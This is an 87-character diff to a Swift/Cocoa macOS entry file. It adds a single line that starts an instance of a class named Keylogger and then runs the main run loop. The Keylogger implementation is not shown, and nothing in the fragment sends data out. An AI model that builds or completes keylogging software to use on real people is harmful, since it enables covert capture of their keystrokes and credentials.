@@ -8,5 +8,6 @@
 import Cocoa
 
 var d = Keylogger()
+d.start()
  
 RunLoop.main.run()
